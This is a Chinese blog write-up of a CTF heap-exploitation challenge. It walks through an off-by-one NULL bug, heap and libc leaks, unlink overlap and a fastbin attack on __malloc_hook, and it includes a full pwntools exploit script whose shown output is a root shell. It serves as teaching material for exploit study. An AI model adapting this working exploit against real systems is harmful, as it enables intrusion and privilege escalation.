---
layout: post
title: 【CTF】off_by_one_NULL堆利用
date: 2019-4-6
categories: blog
tags: 
description: 
---

## 简介
CTF中的一道PWN题，漏洞点是off by one NULL。由于之前未做过堆利用的题目，而该题又涉及多个堆的知识点，因此做个笔记，以新手视角记录如何解决该题。

该题涉及的知识点（后文会展开讲解）：

a) 堆信息泄露（堆地址&libc地址）

b) off_by_one_NULL

c) unlink

d) overlap

e) fastbin attack

ps:膜一波某白神，作为新手能理解该题，全靠某白神的writeup。

## curse_note题目描述
OS:     Ubuntu 64位

libc：  glibc 2.23


基础防护：

RELRO:    Partial RELRO

Stack:    Canary found

NX:       NX enabled

PIE:      PIE enabled

由于题目非外部公开，因此就不放原题了，该部分仅描述题目的逻辑和重点。
题目内容是一个笔记管理系统，仅具备增、查、删三个功能，且笔记数量约束为不超过3个（即index只能为0,1,2）。

题目运行效果如下：
```
$ ./xxxx_note 
1. new note
2. show note
3. delete note
4. exit
choice: 1
index: 0
size: 8
info: AAAAAAAA
1. new note
2. show note
3. delete note
4. exit
choice: 2
index: 0
AAAAAAA
1. new note
2. show note
3. delete note
4. exit
choice: 3
index: 0
1. new note
2. show note
3. delete note
4. exit
choice: 2
index: 0
1. new note
2. show note
3. delete note
4. exit
choice: 4
$ 
```

其中存在问题的new note函数如下：
```
__int64 new_note()
{
  int index; // [sp+Ch] [bp-14h]@1
  size_t size; // [sp+10h] [bp-10h]@2
  __int64 v3; // [sp+18h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  index = read_index();
  if ( index != -1 )
  {
    printf("size: ");
    read_size(&size);     // size是个无符号整数，因此最大可输入2^64
    if ( (size & 0x8000000000000000LL) == 0LL && !note_array[index] )
    {
      note_array[index] = malloc(size);      // 问题1：malloc时未限制size大小
      printf("info: ");                    // 问题2：未判断malloc是否成功
      read(0, note_array[index], size);      // 问题3：内存使用前未清零
      *((_BYTE *)note_array[index] + size - 1) = 0;      // off_by_one_NULL
      note_size_array[index] = size;
    }
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

## 解题思路

根据分析new_note函数，我们发现了三个问题：

1) malloc时未限制size大小

2) 未判断malloc是否成功

3) 内存使用前未清零


这三个问题可进行如下利用：

1) 利用问题3，可以泄露堆地址和libc地址（从链表中取下堆块时，可以读到堆块在仍在链表里时的前项和后项，即fd和bk）

2) 利用问题1和2，可以造成off_by_one_NULL（size过大时malloc返回0，`*((_BYTE *)note_array[index] + size - 1) = 0;`等价于`*((_BYTE *) size - 1) = 0;`，即任意地址写零）

因此大致的解题思路如下：

1) 泄露堆地址和libc地址

2) 利用off_by_one_NULL和unlink构造fastbin的overlap

3) 利用fastbin attack和libc地址，将__malloc_hook的got修改为one_gadget


## 解题过程

关于堆的基本知识，推荐先在该网站进行了解：

>https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction/

建议先阅读完成wiki中前三节的内容，再回到本博客继续阅读。

###1) 泄露堆地址和libc地址

bin中的chunk以链表的形式保存，将chunk从列表取下后，若未执行memset等清零操作，将能读取到链表的指针，即chunk的fd和bk。

不同的bin使用了不同的链表，本次使用unsortbin的双向链表，以方便一次性获取堆地址和libc地址

通过代码构造unsortbin如下：
![](https://raw.githubusercontent.com/zzz4ck/zzz4ck.github.io/master/screenshot/note_step1.PNG)

代码如下：
```
# 1. leak heap & libc address

new_note(0, 0xf0-8, 'A'*(0xf0-8-1)) #chunk_AAA
new_note(1, 0x70-8, 'B'*(0x70-8-1)) #chunk_BBB
new_note(2, 0x100-8, 'C'*(0x100-8-1))   #chunk_CCC
delete_note(1)  #因为只能创建3个chunk，需要先删chunk_BBB
new_note(1, 0x10, 'D'*(0x10-1)) #chunk_DDD
delete_note(1)  #利用fastbin中chunk的pre_size为1特性，避免chunk_CCC释放时合入top chunk
new_note(1, 0x70-8, 'B'*(0x70-8-1)) #chunk_BBB is back
delete_note(2)  #free chunk_AAA to unsortbin
delete_note(0)  #free chunk_CCC to unsortbin
new_note(2, 0x100-8, 'C'*7) #chunk_CCC的bk为chunk_AAA的地址，即堆地址
addr = show_note(2)
heap = u64(addr[8:16])
log.info('heap address: %s', hex(heap))

new_note(0, 0xf0-8, 'A'*7)  #chunk_AAA的bk为main_arena+0x58的地址，即main_arena中top chunk的地址
addr = show_note(0)
main_arena = u64(addr[8:16])-0x58
log.info('main_arena address: %s', hex(main_arena))
libc = main_arena - libc_elf.symbols['__malloc_hook'] -0x10 #libc中__malloc_hook位于main_arena+0x10地址处
log.info('libc address: %s', hex(libc))
delete_note(0)
delete_note(1)
delete_note(2)
```

这里有个坑，由于malloc大size失败后，再次malloc时glibc会从thread_arena中分配内存，而不继续使用main_arena。

因此这里还需要先泄露thread_arena的地址（泄露方法同上）:
```
# 2. switch thread_arena and leak address

new_note(0, heap+0x100, 'E')    #该chunk分配会失败，之后进入thread_arena
new_note(0, 0xf0-8, 'A'*(0xf0-8-1))
new_note(1, 0x70-8, 'B'*(0x70-8-1))
new_note(2, 0x100-8, 'C'*(0x100-8-1))
delete_note(1)
new_note(1, 0x10, 'D'*(0x10-1))
delete_note(1)
new_note(1, 0x70-8, 'B'*(0x70-8-1))
delete_note(2)
delete_note(0)
new_note(2, 0x100-8, 'C'*7)
addr = show_note(2)
thread_arena = u64(addr[8:16])
log.info('thread_arena address: %s', hex(thread_arena))
delete_note(1)
delete_note(2)
```

###2) 利用off_by_one_NULL和unlink构造fastbin的overlap

接下来开始布局overlap

注：overlap可以理解为堆块重叠，chunk_AAA中包含了chunk_BBB

此处需说明下，由于我们的操作都在thread_arena中进行，因此每个堆块的的NON_MAIN_ARENA位需要为1（即size&0x4==1）

因此我们通过off_by_one_NULL清空pre_isused的时候，也会把NON_MAIN_ARENA清空，所以需要先清空chunk_CCC的pre_isused位后，再分配chunk_CCC，将NON_MAIN_ARENA复位为1。

unlink前的布局如下：
![](https://raw.githubusercontent.com/zzz4ck/zzz4ck.github.io/master/screenshot/note_step2.PNG)

代码如下：
```
# 3. overlay chunk_BBB(fastbin)

new_note(1, 0x70-8, 'B'*(0x70-8-8)+p64(0x160))  #构造chunk_BBB，并将chunk_CCC的pre_size设置为0x160，即unlink时将chunk_AAA也纳入合并
new_note(2, 0x10, 'D'*0x7)  #利用chunk_DDD，避免chunk_CCC释放时合入top chunk

new_note(0, thread_arena+0x160+8+1, '*')    #将chunk_CCC的pre_isused位先置空，若在chunk_CCC分配后置空，将影响NON_MAIN_ARENA位，因为在thread_arena中，所以NON_MAIN_ARENA位必须为1
new_note(0, 0x100-8, 'C'*(0x100-8-8))
delete_note(0)  #触发unlink，此时chunk_AAA、chunk_BBB和chunk_CCC合并为一块chunk，并放入unsortbin
delete_note(1)  #将chunk_BBB释放回fastbin，完成overlap，该步骤也可理解为double free
```

该步骤完成后，可利用pwngdb的arenainfo查看，可以看到我们的chunk_BBB已经在`fastbin[5]`中显示overlap
```
gdb-peda$ arenainfo
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55d4ff772000 (size : 0x21000) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
===================  Arena 1  ====================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x7fa8b40009a0 (overlap chunk with 0x7fa8b40008b0(freed) )
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x7fa8b4000b30 (size : 0x204d0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x7fa8b40008b0 (size : 0x260)
gdb-peda$ 
```


###3) fastbin attack
现在我们手头有一个size为0x260并处于unsortbin的chunk，同时在该chunk中overlap了一个size为0x70的fastbin chunk。

>Q：为什么overlap的chunk的size要是0x70？
>
>A：因为fastbin的范围为0x20~0xb0，__malloc_hook附近只有高位地址的0x7f适合作为chunk的size，因此我们的chunk的size选用0x70，否则报错。

因此我们可以通过malloc unsortbin中的chunk，往overlap的chunk_BBB中填写数据，使得chunk_BBB的fd指向包含了__malloc_hook的数据块，第二次分配fastbin chunk时，即可对__malloc_hook进行改写。

通过一张图来说明：
![](https://raw.githubusercontent.com/zzz4ck/zzz4ck.github.io/master/screenshot/note_step3.PNG)

代码如下：
```
# 4.fastbin attack

onegadget = libc + 0xf1147  #one_gadget在libc的偏移，可利用github的one_gadget工具得到

new_note(0, 0x160, 'A'*0xe0+p64(0xf0)+p64(0x74)+p64(libc+libc_elf.symbols['__malloc_hook']-0x23)+'B'*0x57)  #分配chunk_AAA，重点修改overlap的chunk_BBB的fd
new_note(1, 0x70-8, 'A'*(0x70-8-1)) #第一次分配fastbin，分配后fastbin指向__malloc_hook-0x23
delete_note(2)
new_note(2, 0x70-8, 'A'*0x13+p64(onegadget)+'zzz') #第二次分配fastbin，此时修改__malloc_hook为one_gadget
delete_note(1)

p.sendline('1')
p.recvuntil('index: ')
p.sendline('1')
p.recvuntil('size: ')
p.sendline('1')
p.interactive() #get shell
```


## 最终脚本

```
from pwn import *
import time

def new_note(index,size,info):
    p.sendline("1")
    #print 1
    p.recvuntil("index: ")
    p.sendline(str(index))
    #print index
    p.recv(512)
    p.sendline(str(size))
    #print size
    p.recvuntil("info: ")
    if info == '*':
        p.sendline('')
    else:
        p.sendline(info)
    #print info
    p.recvuntil("choice: ")

def show_note(index):
    p.sendline("2")
    #print 2
    p.recvuntil("index: ")
    p.sendline(str(index))
    #print index
    return p.recvuntil("choice: ")

def delete_note(index):
    p.sendline("3")
    #print 3
    p.recvuntil("index: ")
    p.sendline(str(index))
    #print index
    p.recvuntil("choice: ")

def exit():
    p.sendline("4")
    #print 4

context.arch = 'amd64'
context.log_level = 'info'
libc_elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process("./curse_note_patch")
p.recvuntil("choice: ")

# 1. leak heap & libc address

new_note(0, 0xf0-8, 'A'*(0xf0-8-1)) #chunk_AAA
new_note(1, 0x70-8, 'B'*(0x70-8-1)) #chunk_BBB
new_note(2, 0x100-8, 'C'*(0x100-8-1))   #chunk_CCC
delete_note(1)  #因为只能创建3个chunk，需要先删chunk_BBB
new_note(1, 0x10, 'D'*(0x10-1)) #chunk_DDD
delete_note(1)  #利用fastbin中chunk的pre_size为1特性，避免chunk_CCC释放时合入top chunk
new_note(1, 0x70-8, 'B'*(0x70-8-1)) #chunk_BBB is back
delete_note(2)  #free chunk_AAA to unsortbin
delete_note(0)  #free chunk_CCC to unsortbin
new_note(2, 0x100-8, 'C'*7) #chunk_CCC的bk为chunk_AAA的地址，即堆地址
addr = show_note(2)
heap = u64(addr[8:16])
log.info('heap address: %s', hex(heap))

new_note(0, 0xf0-8, 'A'*7)  #chunk_AAA的bk为main_arena+0x58的地址，即main_arena中top chunk的地址
addr = show_note(0)
main_arena = u64(addr[8:16])-0x58
log.info('main_arena address: %s', hex(main_arena))
libc = main_arena - libc_elf.symbols['__malloc_hook'] -0x10 #libc中__malloc_hook位于main_arena+0x10地址处
log.info('libc address: %s', hex(libc))
delete_note(0)
delete_note(1)
delete_note(2)

# 2. switch thread_arena and leak address

new_note(0, heap+0x100, '*')    #该chunk分配会失败，之后进入thread_arena
new_note(0, 0xf0-8, 'A'*(0xf0-8-1))
new_note(1, 0x70-8, 'B'*(0x70-8-1))
new_note(2, 0x100-8, 'C'*(0x100-8-1))
delete_note(1)
new_note(1, 0x10, 'D'*(0x10-1))
delete_note(1)
new_note(1, 0x70-8, 'B'*(0x70-8-1))
delete_note(2)
delete_note(0)
new_note(2, 0x100-8, 'C'*7)
addr = show_note(2)
thread_arena = u64(addr[8:16])
log.info('thread_arena address: %s', hex(thread_arena))
delete_note(1)
delete_note(2)

# 3. overlay chunk_BBB(fastbin)

new_note(1, 0x70-8, 'B'*(0x70-8-8)+p64(0x160))  #构造chunk_BBB，并将chunk_CCC的pre_size设置为0x160，即unlink时将chunk_AAA也纳入合并
new_note(2, 0x10, 'D'*0x7)  #利用chunk_DDD，避免chunk_CCC释放时合入top chunk

new_note(0, thread_arena+0x160+8+1, '*')    #将chunk_CCC的pre_isused位先置空，若在chunk_CCC分配后置空，将影响NON_MAIN_ARENA位，因为在thread_arena中，所以NON_MAIN_ARENA位必须为1
new_note(0, 0x100-8, 'C'*(0x100-8-8))
delete_note(0)  #触发unlink，此时chunk_AAA、chunk_BBB和chunk_CCC合并为一块chunk，并放入unsortbin
delete_note(1)  #将chunk_BBB释放回fastbin，完成overlap，该步骤也可理解为double free

# 4.fastbin attack

onegadget = libc + 0xf1147  #one_gadget在libc的偏移，可利用github的one_gadget工具得到

new_note(0, 0x160, 'A'*0xe0+p64(0xf0)+p64(0x74)+p64(libc+libc_elf.symbols['__malloc_hook']-0x23)+'B'*0x57)  #分配chunk_AAA，重点修改overlap的chunk_BBB的fd
new_note(1, 0x70-8, 'A'*(0x70-8-1)) #第一次分配fastbin，分配后fastbin指向__malloc_hook-0x23
delete_note(2)
new_note(2, 0x70-8, 'A'*0x13+p64(onegadget)+'zzz') #第二次分配fastbin，此时修改__malloc_hook为one_gadget
delete_note(1)

p.sendline('1')
p.recvuntil('index: ')
p.sendline('1')
p.recvuntil('size: ')
p.sendline('1')
p.interactive() #get shell

exit()
```

运行效果：
```
$ python curse_note_wp.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './xxxx_note': pid 55258
[*] heap address: 0x55692d9a5000
[*] main_arena address: 0x7f2f56cc5b20
[*] libc address: 0x7f2f56901000
[*] thread_arena address: 0x7f2f500008b0
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$  

```